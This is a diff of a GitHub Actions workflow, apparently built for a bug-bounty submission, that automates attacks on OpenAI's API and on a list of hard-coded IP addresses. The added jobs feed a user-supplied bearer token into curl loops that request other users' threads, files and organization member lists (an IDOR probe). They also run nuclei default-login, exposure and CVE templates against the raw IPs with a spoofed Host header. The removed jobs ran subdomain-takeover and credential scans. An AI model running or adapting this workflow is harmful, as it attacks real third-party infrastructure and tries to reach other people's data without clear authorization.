@@ -1,99 +1,81 @@
-name: OpenAI Zero-Denial pari 
+name: OpenAI Master POC Strike
 on:
   workflow_dispatch:
+    inputs:
+      auth_token:
+        description: 'Bearer sk-... or sess-...'
+        required: true
 
 jobs:
-  strike-suite:
+  poc-generation:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # Running 3 specialized parallel engines
-        engine: [takeover-verification, credential-audit, ownership-proof]
+        strike_type: [idor-scan, infra-exploit, evidence-gather]
     
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v4
-
-      - name: Install Professional Arsenal
+      - name: Setup Tools
         run: |
           go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-          sudo apt-get install -y whois
+          sudo apt-get install -y whois curl zip
           echo "$HOME/go/bin" >> $GITHUB_PATH
 
-      # ENGINE 1: Ownership Proof (The "Anti-Denial" Layer)
-      - name: Generate Undeniable Ownership Evidence
-        if: matrix.engine == 'ownership-proof'
+      # 1. IDOR STRIKE: Testing cross-user access for Threads and Files
+      - name: IDOR POC Engine
+        if: matrix.strike_type == 'idor-scan'
         run: |
-          mkdir -p evidence
-          cat <<EOF > target_list.txt
+          mkdir -p poc/idor
+          # We fuzz IDs based on known OpenAI patterns (thread_*, file-*, org-*)
+          # Replace 'thread_target' with a ID you suspect is NOT yours
+          cat <<EOF > idor_targets.txt
+          https://api.openai.com/v1/threads/thread_target_abc
+          https://api.openai.com/v1/files/file_target_xyz/content
+          https://api.openai.com/v1/organizations/org_target_123/users
+          EOF
+
+          while read url; do
+            echo "Testing IDOR on $url..."
+            curl -v -s -H "Authorization: Bearer ${{ github.event.inputs.auth_token }}" \
+                 -H "OpenAI-Beta: assistants=v2" \
+                 "$url" > "poc/idor/$(date +%s)_resp.txt" 2> "poc/idor/$(date +%s)_log.txt"
+          done < idor_targets.txt
+
+      # 2. INFRA STRIKE: Attacking the Korea AWS Shadow-IT Cluster
+      - name: Infra POC Engine
+        if: matrix.strike_type == 'infra-exploit'
+        run: |
+          mkdir -p poc/infra
+          cat <<EOF > ips.txt
           13.125.127.14
           43.202.58.124
           43.202.58.199
           43.202.58.155
           43.202.58.133
           EOF
+
+          # Nuclei strike with full request/response logging for the report
+          nuclei -l ips.txt -H "Host: api.openai.com" \
+            -t http/default-logins/ -t http/exposures/ -t http/cves/ \
+            -debug -o poc/infra/vuln_findings.txt
           
+          # Force a banner grab to prove ownership
           while read ip; do
-            echo "--- PROOF FOR $ip ---" >> evidence/ownership_report.txt
-            whois $ip | grep -iE "OrgName|NetName|Organization|Address|Country" >> evidence/ownership_report.txt
-            echo "HTTP Banner Analysis:" >> evidence/ownership_report.txt
-            curl -I -s -H "Host: api.openai.com" --connect-timeout 5 $ip | grep -iE "Server|X-Powered-By|Set-Cookie" >> evidence/ownership_report.txt
-            echo -e "\n" >> evidence/ownership_report.txt
-          done < target_list.txt
+             echo "--- Evidence for $ip ---" >> poc/infra/ownership_proof.txt
+             whois $ip | grep -iE "OrgName|NetName" >> poc/infra/ownership_proof.txt
+             curl -I -s -k -H "Host: api.openai.com" "http://$ip" >> poc/infra/ownership_proof.txt
+          done < ips.txt
 
-      # ENGINE 2: Takeover & DNS Validation
-      - name: Verify Dangling Subdomains
-        if: matrix.engine == 'takeover-verification'
+      # 3. CONSOLIDATE: Zip all evidence for Bugcrowd upload
+      - name: Evidence Packaging
+        if: always()
         run: |
-          mkdir -p evidence
-          # List from your manual 'host' command findings
-          cat <<EOF > dangling_subs.txt
-          13cdn.openai.com
-          aapi.openai.com
-          alpha.openai.com
-          example-resource.azure.openai.com
-          your-company.azure.openai.com
-          billing.openai.com
-          dev.openai.com
-          EOF
-          
-          # Nuclei with -me (Manual Evidence) captures the actual response body
-          nuclei -l dangling_subs.txt -t http/takeovers/ -me evidence/takeover_poc/ -o evidence/takeover_results.txt
+          zip -r openai_bounty_poc.zip poc/
 
-      # ENGINE 3: The Jackpot Hunt (Creds & Vulns)
-      - name: Default Credential & Exposure Audit
-        if: matrix.engine == 'credential-audit'
-        run: |
-          mkdir -p evidence
-          cat <<EOF > origins.txt
-          43.202.58.124
-          43.202.58.199
-          13.125.127.14
-          EOF
-
-          # Verify it's not a catch-all before wasting time
-          while read ip; do
-            RANDOM_PATH="check_$(date +%s)"
-            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: api.openai.com" "$ip/$RANDOM_PATH")
-            if [ "$STATUS" != "200" ]; then
-              echo "[+] $ip is VALID for testing. Starting Nuclei Strike..."
-              # Target Default Credentials, Admin Panels, and Sensitive Exposures
-              nuclei -u "http://$ip" -H "Host: api.openai.com" \
-                -t http/default-logins/ \
-                -t http/exposed-panels/ \
-                -t http/exposures/ \
-                -severity critical,high,medium \
-                -rate-limit 15 -o evidence/vulnerabilities_found.txt
-            else
-              echo "[-] $ip is a CATCH-ALL. Skipping to prevent false positives."
-            fi
-          done < origins.txt
-
-      - name: Upload Bounty Evidence Package
+      - name: Upload Final POC
         uses: actions/upload-artifact@v4
         with:
-          name: openai-evidence-${{ matrix.engine }}
-          path: evidence/
+          name: OpenAI-Final-POC-${{ matrix.strike_type }}
+          path: openai_bounty_poc.zip
           
